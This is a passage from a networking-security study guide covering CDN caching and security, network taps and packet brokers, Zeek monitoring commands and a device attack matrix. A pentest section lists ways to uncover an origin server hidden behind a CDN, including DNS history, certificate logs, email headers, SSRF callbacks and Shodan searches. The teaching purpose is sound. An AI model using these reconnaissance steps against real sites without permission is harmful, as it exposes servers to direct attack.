  Anycast DNS: User's DNS query routed to nearest CDN PoP

Cache behavior:
  Cache-Control: max-age=86400   → CDN caches for 24 hours
  Cache-Control: no-cache        → CDN always fetches from origin
  ETag:                          → CDN validates freshness via hash
  
CDN cache headers (understanding for DevOps):
  X-Cache: HIT  → served from CDN cache (fast!)
  X-Cache: MISS → CDN fetched from origin (slower)
  
  curl -I https://example.com | grep -i cache
  
Security features of CDNs:
  DDoS mitigation: Absorb volumetric attacks at edge (1+ Tbps capacity)
  WAF: Block SQLi, XSS at CDN edge before reaching origin
  Bot management: Distinguish humans from bots
  Rate limiting: At edge, before origin is hit
  TLS termination: CDN handles TLS, origin can be HTTP internally
  Shield/Origin protection: Only CDN IPs can reach origin
  
CDN providers comparison:
  Cloudflare:  DDoS leader, free tier, Anycast
  AWS CloudFront: Native AWS integration, Lambda@Edge
  Akamai:     Enterprise, largest network (340,000+ servers)
  Fastly:     Developer-friendly, real-time purging, edge computing
  GCP Cloud CDN: GCP native, Google's global network
```

### CDN Security Bypass (Pentest Technique)

```
CDN hides origin IP. Finding origin IP is valuable for pentesting:

1. DNS history lookup:
   https://securitytrails.com
   Look for old A records before CDN was added
   
2. SSL certificate transparency:
   https://crt.sh/?q=example.com
   Origin might have cert with direct IP
   
3. Email headers:
   Send email to target domain, check received headers
   Mail server often not behind CDN → reveals IP range

4. Subdomains:
   dev.example.com, staging.example.com often not behind CDN
   
5. SSRF on target application:
   If app fetches URLs, trigger it to fetch your server
   → You receive connection from origin IP

6. Shodan/Censys:
   Search for HTTP header fingerprints, server banners
   shodan search 'http.title:"Company Name" country:US'

Defense:
  Firewall origin server: only accept traffic from CDN IP ranges
  # Cloudflare IP ranges: https://www.cloudflare.com/ips/
  
  iptables -A INPUT -p tcp --dport 443 -m set --match-set cloudflare src -j ACCEPT
  iptables -A INPUT -p tcp --dport 443 -j DROP
```

---

## 28. Network Taps & Packet Brokers

### Layman's Terms
A network tap is like a **T-junction in a water pipe** with a small sample port. Water (traffic) flows normally through the main pipe, but you can put a cup (capture device) at the T-junction to sample what's flowing — without interrupting the flow.

### Formal Definition
A network tap (Test Access Point) is a passive hardware device that creates a copy of the traffic flowing through a network segment and forwards it to monitoring or security tools, without introducing latency or interruption to the live traffic path.

### Types of Network Visibility

```
1. NETWORK TAP (Passive, hardware):
   Physical inline device
   Copies all traffic to monitoring port
   Completely passive — fails open if power lost
   Captures everything including errors, malformed frames
   
   ┌──────────────────────────────────────────────┐
   │                                               │
   Network  ──┤ TAP ├──  Network                  │
               │                                  │
               └────────────►  IDS/Wireshark      │
                  Full copy                       │
   
2. SPAN PORT (Switch Port Analyzer / Mirror Port):
   Software feature on managed switches
   Mirror one or more ports to a monitoring port
   Cost: free (existing switch feature)
   Limitation: CPU overhead on switch, can drop packets under load
   
   Cisco SPAN config:
   monitor session 1 source interface fa0/1 - 10  # mirror ports 1-10
   monitor session 1 destination interface fa0/24 # send to port 24
   
   RSPAN (Remote SPAN): Mirror across multiple switches via VLAN:
   vlan 999 (RSPAN VLAN)
   monitor session 1 source interface fa0/1
   monitor session 1 destination remote vlan 999
   
3. PACKET BROKER (Network Traffic Broker):
   Aggregates feeds from multiple taps/SPAN ports
   Distributes to multiple security tools (IDS, DLP, forensics)
   Filters: send only HTTP traffic to web proxy, only FTP to DLP
   Load balances: spread traffic across multiple IDS instances
   
   Architecture:
   Tap 1 ─┐
   Tap 2 ─┤                    ┌─ IDS Instance 1
   Tap 3 ─┤─► PACKET BROKER ──┤─ IDS Instance 2  
   SPAN  ─┘   (aggregation +   └─ DLP Tool
               filtering +
               load balance)
```

### Zeek (Bro) Network Security Monitor

```bash
# Zeek is not an IDS but a network analysis framework
# Generates rich logs (conn.log, dns.log, http.log, ssl.log, etc.)

sudo apt install zeek -y

# Configure network interface
sudo vi /etc/zeek/node.cfg
# [zeek]
# type=standalone
# host=localhost
# interface=eth0

# Start Zeek
sudo zeekctl deploy

# Real-time log analysis
tail -f /usr/local/zeek/logs/current/conn.log | zeek-cut id.orig_h id.resp_h proto service

# Find all DNS queries:
cat /usr/local/zeek/logs/current/dns.log | zeek-cut query answers | head 30

# Find large data transfers (potential exfiltration):
cat /usr/local/zeek/logs/current/conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes | \
  awk '$3+$4 > 1000000' | sort -k3 -rn | head 10

# Detect DNS tunneling (unusually long DNS names):
cat /usr/local/zeek/logs/current/dns.log | zeek-cut query | \
  awk 'length($0) > 50' | sort | uniq -c | sort -rn
```

---

## 29. Device Attack Surface Summary

### Complete Device-to-Attack Matrix

| Device | OSI Layers | Top Attacks | Detection Method | Hardening Priority |
|--------|-----------|-------------|-----------------|-------------------|
| Hub | L1 | Passive sniffing, physical tap | N/A (legacy) | Replace with switch |
| Switch | L2 | MAC flood, ARP spoof, VLAN hop, STP attack | DAI, DHCP snooping, STP logs | DAI + 802.1X + port security |
| Router | L3 | IP spoofing, route injection, OSPF/BGP hijack | uRPF, routing protocol auth monitoring | uRPF + route auth + ACLs |
| Firewall | L3-L7 | Rule bypass, fragmentation, protocol tunneling | Traffic anomaly detection, log review | Strict egress, log all drops |
| Load Balancer | L4/L7 | Slowloris, H2 rapid reset, backend SSRF | Connection rate monitoring | Timeout tuning, rate limits |
| Proxy | L7 | WPAD hijack, SSL strip, bypass via IPv6 | Proxy log analysis, SIEM | Force proxy use, block direct |
| IDS/IPS | L2-L7 | Signature evasion, fragmentation bypass | Tuning, threat hunting | Anomaly detection + signatures |
| VPN Gateway | L3/L4 | Credential brute force, split tunneling abuse | Auth failure monitoring | MFA + certificate auth |
| Wireless AP | L1/L2 | Evil Twin, PMKID, deauth flood | WIDS (Wireless IDS) | WPA3 + 802.1X + WIDS |
| WLC | L2/L7 | Rogue AP, CAPWAP manipulation | WLC rogue detection | Enable rogue containment |
| NAS | L2/L7 | EternalBlue, NFS misconfiguration, SMB relay | SMB signing, file access logs | Disable SMBv1, sign SMB |
| SAN | L2/L4 | LUN masking bypass, iSCSI sniffing | Access logs, zone audits | FC hard zoning + iSCSI IPsec |
| CDN | L7 | Origin exposure, cache poisoning | Origin access logs | Shield origin, restrict by CDN IPs |
| TAP/Broker | L1/L2 | Physical access to tap | Physical security monitoring | Lock rack, tamper detection |

### The Defense Stack — All Devices Together

```
Internet
   │
   ▼
[CDN / WAF Layer]        ← L7 DDoS, bot, web attack mitigation
   │
   ▼
[Edge Router]            ← BCP38 anti-spoof, BGP RPKI, ACLs
   │
   ▼
[External Firewall]      ← Stateful, NAT, zone policy
   │
   ▼
[DMZ Network]
  ├── Web Servers
  ├── Mail Gateway
  └── Public DNS
   │
   ▼
[Internal Firewall]      ← Strict DMZ→Internal deny
   │
   ▼
[Core L3 Switch]         ← Inter-VLAN routing, OSPF
   │
   ├── [VLAN 10] HR ─── Switch (802.1X, DAI, Port Security)
   ├── [VLAN 20] Finance
   ├── [VLAN 30] Engineering
   └── [VLAN 99] Servers
        │
        ├── NAS (SMBv3 signed, NFSv4 Kerberos)
        ├── SAN (FC zoning, iSCSI IPsec)
        └── Application Servers
   │
   ▼
[Network TAP + Packet Broker]
   ├── Zeek/Suricata (NSM)
   ├── IDS/IPS
   └── SIEM (Splunk/Elastic)
   │
   ▼
[WLC]
   └── APs (WPA3-Enterprise, 802.1X, WIDS)
```

---

*This document is a companion to `OSI_Model_Deep_Dive.md`. Cross-reference the OSI file for: ARP spoofing mechanics, port scanning techniques, TCP/UDP basics, ICMP definitions, and per-layer protocol details.*

*Standards references: RFC 791 (IPv4), RFC 793 (TCP), RFC 826 (ARP), RFC 1918 (Private IP), RFC 4271 (BGP), RFC 2460 (IPv6), RFC 4861 (NDP), RFC 5415 (CAPWAP), RFC 7296 (IKEv2), RFC 8446 (TLS 1.3), RFC 9000 (QUIC)*